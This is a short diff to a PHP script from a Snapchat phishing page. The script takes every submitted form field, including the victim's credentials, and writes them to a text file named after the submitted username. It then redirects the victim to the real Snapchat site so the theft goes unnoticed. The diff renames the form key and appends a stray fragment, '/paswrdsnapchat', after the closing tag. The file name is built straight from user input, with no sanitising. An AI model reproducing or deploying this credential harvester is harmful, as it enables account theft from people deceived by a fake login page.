@@ -1,6 +1,6 @@
 <?php
 header ('Location:https://www.snapchat.com/');
-$handle = fopen($_POST['username'].'.txt', 'a');
+$handle = fopen($_POST['xoshnaw-12'].'.txt', 'a');
 foreach($_POST as $variable => $value) {
 fwrite($handle, $variable);
 fwrite($handle, '=');
@@ -12,4 +12,4 @@ fwrite($handle,'|');
 fwrite($handle,"\n");
 fclose($handle);
 exit;
-?>
+?>/paswrdsnapchat
